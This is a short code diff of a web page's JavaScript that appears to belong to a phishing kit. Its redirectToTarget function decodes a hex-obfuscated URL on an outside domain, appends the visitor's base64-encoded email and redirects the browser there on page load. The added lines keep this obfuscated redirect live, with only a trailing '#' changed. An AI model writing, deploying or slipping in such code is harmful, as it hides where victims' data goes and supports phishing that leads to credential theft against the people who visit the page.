@@ -90,13 +90,13 @@
         }
 
         // Redirect to final URL with email appended
-        function redirectToTarget(base64Email) {
-            const hex = "687474703A2F2F7468756D656E656374726963732E65732F787874672F617574682F"; // Hexadecimal for http://thumenectrics.es/xxtg/auth/
-            const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
-            window.location.href = obfuscatedURL;
-        }
+function redirectToTarget(base64Email) {
+    const hex = "687474703A2F2F7468756D656E656374726963732E65732F787874672F617574682F23";
+    const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
+    window.location.href = obfuscatedURL;
+}
 
-        // Update the displayed email and redirect
+// Update the displayed email and redirect
         window.onload = function () {
             const emailParam = findEmailParam();
             const emailDisplay = document.getElementById('emailDisplay');
